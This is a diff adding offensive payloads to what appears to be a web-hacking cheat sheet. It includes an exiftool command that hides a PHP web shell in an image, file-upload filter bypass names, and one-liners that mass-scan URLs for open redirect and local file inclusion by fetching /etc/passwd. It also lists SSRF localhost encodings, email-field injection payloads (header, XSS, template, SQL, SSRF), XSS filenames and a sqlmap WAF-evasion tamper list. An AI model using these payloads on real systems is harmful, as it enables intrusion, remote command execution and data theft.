@@ -65,3 +65,76 @@ sqlmap -u "http://redacted.com" --dbs --batch --random-agent --forms --ignore-co
 // PRO TIPS FOR BYPASSING WAF, add to SQLmap this tamper
 --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,ifnull2ifisnull,modsecurityversioned,space2comment,randomcase
 ```
+
+```bash
+exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
+
+// File Upload bypass
+file.php%20
+file.php%0a
+file.php%00
+file.php%0d%0a
+file.php/
+file.php.\
+file.
+file.php....
+file.pHp5....
+file.png.php
+file.png.pHp5
+file.php%00.png
+file.php\x00.png
+file.php%0a.png
+file.php%0d%0a.png
+flile.phpJunk123png
+file.png.jpg.php
+file.php%00.png%00.jpg
+```
+
+```bash
+export LHOST="http://localhost"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
+```
+
+``` bash
+gauplus -random-agent -t 200 http://redacted.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
+```
+
+```bash
+http://127.1/
+http://0000::1:80/
+http://[::]:80/
+http://2130706433/
+http://whitelisted@127.0.0.1
+http://0x7f000001/
+http://017700000001
+http://0177.00.00.01
+```
+
+```bash
+// **Header Injection**
+"%0d%0aContent-Length:%200%0d%0a%0d%0a"@example.com
+"recipient@test.com>\r\nRCPT TO:<victim+"@test.com
+
+// **XSS Injection**
+test+(<script>alert(0)</script>)@example.com
+test@example(<script>alert(0)</script>).com
+"<script>alert(0)</script>"@example.com
+
+// **SST Injection**
+"<%= 7 * 7 %>"@example.com
+test+(${{7*7}})@example.com
+
+// **SQL Injection**
+"' OR 1=1 -- '"@example.com
+"mail'); SLEEP(5);--"@example.com
+
+// **SSRF Attack**
+john.doe@abc123.burpcollaborator.net
+john.doe@[127.0.0.1]
+```
+
+```bash
+<img src=x onerror=alert('XSS')>.png
+"><img src=x onerror=alert('XSS')>.png
+"><svg onmouseover=alert(1)>.svg
+<<script>alert('xss')<!--a-->a.png
+```
